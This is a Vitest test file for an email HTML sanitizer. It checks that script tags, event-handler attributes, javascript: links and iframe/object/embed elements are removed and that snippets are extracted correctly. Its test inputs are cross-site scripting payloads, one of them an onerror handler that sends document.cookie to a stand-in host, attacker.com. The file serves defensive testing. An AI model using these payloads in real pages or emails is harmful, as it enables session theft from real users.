import { describe, it, expect } from 'vitest';
import { sanitizeEmailHtml, extractSnippet } from '../../src/lib/security/sanitize';

describe('Email HTML Sanitization & Security Tests', () => {
  it('strips <script> tags completely', () => {
    const dirty = '<p>Hello</p><script>alert(document.cookie)</script><p>World</p>';
    const clean = sanitizeEmailHtml(dirty);
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('alert(document.cookie)');
    expect(clean).toContain('<p>Hello</p>');
    expect(clean).toContain('<p>World</p>');
  });

  it('strips malicious onload, onclick, and onerror attributes', () => {
    const dirty = '<img src="valid.jpg" onerror="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)" onclick="doBadThing()" />';
    const clean = sanitizeEmailHtml(dirty);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('onclick');
    expect(clean).toContain('src="valid.jpg"');
    expect(clean).toContain('loading="lazy"');
  });

  it('neutralizes dangerous javascript: href schemes', () => {
    const dirty = '<a href="javascript:alert(1)">Click for free bonus</a>';
    const clean = sanitizeEmailHtml(dirty);
    expect(clean).not.toContain('javascript:');
    expect(clean).not.toContain('href="javascript:');
  });

  it('enforces rel="noopener noreferrer nofollow" and target="_blank" on external links', () => {
    const dirty = '<a href="https://example.com/docs">Open Document</a>';
    const clean = sanitizeEmailHtml(dirty);
    expect(clean).toContain('target="_blank"');
    expect(clean).toContain('rel="noopener noreferrer nofollow"');
  });

  it('strips dangerous iframe, object, and embed elements', () => {
    const dirty = '<iframe src="https://phishing.site"></iframe><object data="bad.swf"></object><embed src="bad.pdf"></embed>';
    const clean = sanitizeEmailHtml(dirty);
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('<object');
    expect(clean).not.toContain('<embed');
  });

  it('extracts clean text snippets without HTML markup', () => {
    const html = '<div><h2>Important Notice</h2><p>This is a <strong>confidential</strong> announcement.</p></div>';
    const snippet = extractSnippet(html, 30);
    expect(snippet).toBe('Important Notice This is a con...');
    expect(snippet).not.toContain('<');
    expect(snippet).not.toContain('>');
  });
});
